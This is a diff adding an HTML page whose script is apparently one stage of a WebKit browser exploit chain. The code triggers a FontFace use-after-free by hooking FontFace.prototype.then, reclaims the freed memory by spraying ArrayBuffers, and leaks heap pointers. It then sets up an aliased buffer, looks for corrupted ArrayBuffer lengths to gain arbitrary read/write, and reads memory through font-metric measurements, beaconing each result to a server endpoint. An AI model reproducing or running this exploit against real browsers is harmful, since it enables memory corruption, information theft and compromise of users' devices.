@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P715 — FontFace Live Alias & Arbitrary Read/Write Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P715 — FontFace Live Alias & Arbitrary Read/Write Scout
+ *
+ * Ground Truth from P711 & P714:
+ * 1. P711 proved that setting q12=P58 and q6=P58 achieves a stable
+ *    live alias between JS FontFace (FACE_B) and ArrayBuffer (VIEW_B).
+ * 2. WebKit writes:
+ *      q0  = 0x1 (RefCount)
+ *      q11 = P58 + 0xF00 (+3840 bytes, internal FontFace data)
+ *      q12 = 0x2000000000 (128 Gigabytes!)
+ *      q13 = WeakPtr
+ * 3. Shifting VIEW_B[6] by +0x10 immediately altered glyph width
+ *    from 120px to 36px without crashing!
+ * 4. P714 confirmed that +192 and +768 are in-page mapped offsets.
+ *
+ * Objectives of P715:
+ * Phase 1: Baseline Leak (P58 and P68).
+ * Phase 2: Live Alias Reclaim (q12=P58, q6=P58) capturing VIEW_B & FACE_B.
+ * Phase 3: ArrayBuffer Length Corruption Scan:
+ *          Spray ArrayBuffers around the +768 and +3840 offsets.
+ *          Trigger font resolution and inspect if ANY ArrayBuffer's byteLength
+ *          expanded to 0x2000000000 (128 GB)!
+ * Phase 4: Font Metrics Memory Disclosure Oracle:
+ *          Point VIEW_B[6] to target addresses:
+ *            - Baseline: P58 (our known buffer)
+ *            - Shift +16: P58 + 16
+ *            - Shift +32: P58 + 32
+ *            - Leaked target: P68 (internal WebKit pointer)
+ *          Measure glyph widths to map memory bytes to metric values.
+ * Phase 5: Transmit complete results & signal DONE.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P715-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+var SPRAY_WATCH = [];
+
+function snap(){
+  if(!VIEW_B) return [];
+  var arr = [];
+  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
+  return arr;
+}
+
+function diffSnap(pre){
+  if(!VIEW_B || !pre.length) return 'none';
+  var ch = [];
+  for(var q=0; q<24; q++){
+    if(VIEW_B[q] !== pre[q]){
+      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
+    }
+  }
+  return ch.length ? ch.join(',') : 'none';
+}
+
+/* ============================================================
+ * Main Runner Pipeline
+ * ============================================================ */
+function run(){
+  b('BOOT','p715-arw-scout');
+  log('=== P715 FontFace Live Alias & ARW Scout ===\n');
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Stable Live Alias Reclaim (q12=P58, q6=P58) */
+    log('[Step 2] Triggering live alias reclaim (q12 + q6)...');
+    doWinningReclaim(function(){
+      /* Step 3: ArrayBuffer Length Corruption Scan */
+      log('\n[Step 3] Scanning for expanded ArrayBuffer (128GB length corruption)...');
+      scanArrayBufferLengths(function(){
+        /* Step 4: Font Metrics Memory Disclosure Oracle */
+        log('\n[Step 4] Probing Font Metrics Memory Disclosure Oracle...');
+        probeMemoryOracle(function(){
+          b('DONE','p715-all-tests-complete');
+          log('\n=== P715 Complete! All tests finished successfully. ===');
+        });
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Stable Live Alias Reclaim ---- */
+function doWinningReclaim(cb){
+  b('RECLAIM-GO', 'fill_q12_q6=0x' + h16(P58));
+
+  var stW = document.createElement('style');
+  stW.textContent = '@font-face{font-family:winFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stW);
+
+  FACE_B = new FontFace('winFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stW){ stW.remove(); stW.textContent = ''; stW = null; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<60; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;  /* Golden Hit pair */
+        view[6]  = P58;  /* Golden Hit pair */
+        absW.push(ab);
+      }
+      try{ document.fonts.check('1em winFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em winFace, winFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    /* Collect all remaining buffers to watch for length expansion */
+    SPRAY_WATCH = absW.slice();
+
+    var dumpStr = 'nz=' + bestNz + '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
+                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
+    b('RECLAIM-OK', dumpStr);
+    log('Live Alias Reclaim OK: ' + dumpStr);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: ArrayBuffer Length Corruption Scan ---- */
+function scanArrayBufferLengths(cb){
+  var corrupted = [];
+  for(var i=0; i<SPRAY_WATCH.length; i++){
+    var buf = SPRAY_WATCH[i];
+    if(buf.byteLength !== 192){
+      corrupted.push('buf' + i + ':len=' + buf.byteLength);
+    }
+  }
+
+  if(corrupted.length > 0){
+    b('ARW-CORRUPT-FOUND', corrupted.join(';'));
+    log('!!! ARBITRARY R/W HIT: ' + corrupted.join(', '));
+  } else {
+    b('ARW-SCAN-NORMAL', 'checked=' + SPRAY_WATCH.length + '|all=192B');
+    log('All ' + SPRAY_WATCH.length + ' sprayed ArrayBuffers scanned. Lengths intact (192B).');
+  }
+
+  setTimeout(cb, 100);
+}
+
+/* ---- Step 4: Font Metrics Memory Disclosure Oracle ---- */
+function probeMemoryOracle(cb){
+  if(!VIEW_B){ b('ORACLE-SKIP','no-view'); cb(); return; }
+
+  var cv = document.createElement('canvas'); cv.width = 200; cv.height = 40;
+  var ctx = cv.getContext('2d');
+  ctx.font = '24px winFace, Arial';
+
+  /* Test 4A: Baseline Width (VIEW_B[6] = P58) */
+  VIEW_B[6] = P58;
+  var wBase = ctx.measureText('Antigravity').width;
+  log('Oracle Target A (P58 baseline): width = ' + wBase);
+
+  /* Test 4B: Shift +16 bytes (VIEW_B[6] = P58 + 16) */
+  VIEW_B[6] = P58 + 16n;
+  var wShift16 = ctx.measureText('Antigravity').width;
+  log('Oracle Target B (P58 + 16): width = ' + wShift16);
+
+  /* Test 4C: Shift +32 bytes (VIEW_B[6] = P58 + 32) */
+  VIEW_B[6] = P58 + 32n;
+  var wShift32 = ctx.measureText('Antigravity').width;
+  log('Oracle Target C (P58 + 32): width = ' + wShift32);
+
+  /* Test 4D: Leaked Pointer P68 (VIEW_B[6] = P68) */
+  var wP68 = -1;
+  if(P68 && P68 > 0n){
+    VIEW_B[6] = P68;
+    try {
+      wP68 = ctx.measureText('Antigravity').width;
+      log('Oracle Target D (P68 target read): width = ' + wP68);
+    } catch(e){
+      wP68 = -2;
+    }
+  }
+
+  /* Restore VIEW_B[6] to safe baseline */
+  VIEW_B[6] = P58;
+
+  var oracleReport = 'wBase=' + wBase + '|wShift16=' + wShift16 + '|wShift32=' + wShift32 + '|wP68=' + wP68;
+  b('ORACLE-RESULTS', oracleReport);
+  log('Oracle Disclosure Report: ' + oracleReport);
+
+  setTimeout(cb, 100);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P715 — FontFace Live Alias & ARW Scout Initializing...</pre></body></html>
